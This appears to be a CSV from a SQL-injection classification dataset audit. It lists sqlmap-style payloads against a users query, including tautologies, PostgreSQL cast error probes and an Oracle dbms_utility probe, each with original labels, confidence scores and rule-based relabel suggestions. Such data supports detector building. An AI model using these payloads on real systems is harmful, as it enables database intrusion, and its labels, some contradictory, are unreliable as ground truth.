payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
"select * from users WHERE username = ""1\' ) and username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" and username = ""-1190\'",error_based,oracle,0.85,basic Oracle with LIKE,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1\' ) and username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" and username = ""-1190\'",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-7430\' ) as xfah where 1596 = 1596 and username = ""-7199\' or username = ""-1190\' and ( ( ( 1248 = 1248""",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-7430\' ) as xfah where 1596 = 1596 and username = ""-7199\' or username = ""-1190\' and ( ( ( 1248 = 1248",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'jzpb\' = \'jzpb"" or username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.9,PostgreSQL cast numeric injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'jzpb\' = \'jzpb"" or username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-6353%\' ) ) or ( \'%\' = \'"" and username = ""-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,postgresql,0.9,PostgreSQL cast for injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-1254"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-1889%\' ) ) ) and ( ( ( \'%\' = \'""",error_based,postgresql,0.9,PostgreSQL cast for injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-1254"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-1889%\' ) ) ) and ( ( ( \'%\' = \'",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-1254"" or username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-1254"" or username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
"select * from users WHERE username = ""1 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1 ) ) and username = ""-6190\' ) where 2621 = 2621",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1 ) ) and username = ""-6190\' ) where 2621 = 2621",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,postgresql,0.85,PostgreSQL char() for injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2783%\' ) ) or username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'""",error_based,oracle,0.9,Oracle with PostgreSQL cast,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2783%\' ) ) or username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\' ) and ( \'izyf\' = \'izyf"" or username = ""1\'|| ( select \'yucg\' where 2576 = 2576 or username = ""-1254""",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1\'|| ( select \'yucg\' where 2576 = 2576 or username = ""-1254",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1 ) ) ) and username = ""-1549\' ) or username = ""-1254""",error_based,oracle,0.8,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1 ) ) ) and username = ""-1549\' ) or username = ""-1254",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"select * from users WHERE username = ""-6353%\' ) ) or ( \'%\' = \'"" or username = ""-5863"" and username = ""1%\' ) ) and ( ( \'%\' = \'""",error_based,oracle,0.85,basic Oracle with LIKE,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-5863"" and username = ""1%\' ) ) and ( ( \'%\' = \'",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"select * from users WHERE username = ""-5863"" and username = ""1"" or username = ""-9770\' ) ) as ovhh where 7903 = 7903",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-5863"" and username = ""1"" or username = ""-9770\' ) ) as ovhh where 7903 = 7903",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-6665\' ) ) ) and ( ( ( \'winx\' = \'winx"" and username = ""-1641\' ) ) and ( ( \'vgcb\' like \'vgcb""",error_based,oracle,0.85,basic Oracle with LIKE,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,-6665\' ) ) ) and ( ( ( \'winx\' = \'winx,True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""-9688%\' ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""-9688%\' ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-8353\' ) ) ) and ( ( ( \'ptlz\' = \'ptlz"" and username = ""1%\' ) ) ) or username = ""-1254""",error_based,oracle,0.85,basic Oracle with LIKE,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,-8353\' ) ) ) and ( ( ( \'ptlz\' = \'ptlz,True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"select * from users WHERE username = ""-9987 ) ) ) and ( ( 8254 = 8254"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1""",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-9987 ) ) ) or# ( ( ( 2114 = 2114"" and username = ""1%\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk""",error_based,oracle,0.8,basic Oracle with LIKE,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,1%\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk,True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"select * from users WHERE username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'"" and username = ""1",error_based,oracle,0.9,Oracle with PostgreSQL cast,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'"" and username = ""1",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1"" and ( ( ( 6395 = 6395"" or username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or# 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",error_based,oracle,0.9,Oracle dbms_utility error function,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,"1"" and ( ( ( 6395 = 6395"" or username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or# 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",True,1,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
"select * from users WHERE username = ""1\' ) or username = ""-1254"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1""",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1\' ) or username = ""-1254"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-6079 ) ) ) and ( ( ( 8708 = 8708"" and username = ""-5863""",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,-6079 ) ) ) and ( ( ( 8708 = 8708,True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"select * from users WHERE username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""-1254"" or username = ""-3424\' ) ) and ( ( \'dyuo\' = \'dyuo""",error_based,oracle,0.85,basic Oracle with LIKE,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-1344 ) as gqgi where 2545 = 2545 and username = ""-1254"" or username = ""-3424\' ) ) and ( ( \'dyuo\' = \'dyuo",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""-1254"" and username = ""-7874 ) ) )",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""-1254"" and username = ""-7874 ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-6353%\' ) )",error_based,postgresql,0.9,PostgreSQL cast for injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-6353%\' ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""-1254"" and username = ""1",error_based,oracle,0.85,basic Oracle with LIKE,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""-1254"" and username = ""1",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-1190\' or username = ""1\'|| ( select \'yucg\' where 2576 = 2576 or username = ""-9564",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-1190\' or username = ""1\'|| ( select \'yucg\' where 2576 = 2576 or username = ""-9564",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-1254"" and username = ""1%\' ) )",error_based,oracle,0.85,basic Oracle with LIKE,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-1254"" and username = ""1%\' ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\' ) ) as plbt where 4368 = 4368 or username = ""-6353%\' ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1\' ) ) as plbt where 4368 = 4368 or username = ""-6353%\' ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-7199\' or username = ""-7962\' ) ) as pgqz where 6058 = 6058 or username = ""-9847%\' ) ) )",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-7199\' or username = ""-7962\' ) ) as pgqz where 6058 = 6058 or username = ""-9847%\' ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-9501\' ) and username = ""-1254"" or username = ""-7209\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.9,PostgreSQL cast for injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-9501\' ) and username = ""-1254"" or username = ""-7209\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011 or username = ""-3424\' ) ) and username = ""1""",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,"1\'|| ( select \'vvpn\' from dual where 7011 = 7011 or username = ""-3424\' ) ) and username = ""1",True,1,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
"select * from users WHERE username = ""-9987 ) ) ) or# ( ( ( 2114 = 2114"" or username = ""-2806\' ) ) )",error_based,oracle,0.8,basic Oracle with LIKE,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-9987 ) ) ) or# ( ( ( 2114 = 2114"" or username = ""-2806\' ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-9847%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.9,PostgreSQL cast numeric,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-9847%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-7199\' and username = ""-9564 or username = ""-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.9,PostgreSQL cast for injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-7199\' and username = ""-9564 or username = ""-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1 ) ) as dgso where 4654 = 4654 or username = ""-8860 ) and username = ""-2756\' where 6156 = 6156",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1 ) ) as dgso where 4654 = 4654 or username = ""-8860 ) and username = ""-2756\' where 6156 = 6156",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-5863"" and username = ""1%\' ) ) and ( ( \'%\' = \'"" and username = ""1 ) ) as dgso where 4654 = 4654",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-5863"" and username = ""1%\' ) ) and ( ( \'%\' = \'"" and username = ""1 ) ) as dgso where 4654 = 4654",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-7199\' or username = ""1 or username = ""-4610\' ) )",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-7199\' or username = ""1 or username = ""-4610\' ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\' ) ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1 ) ) )",error_based,oracle,0.85,basic Oracle injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1\' ) ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1 ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
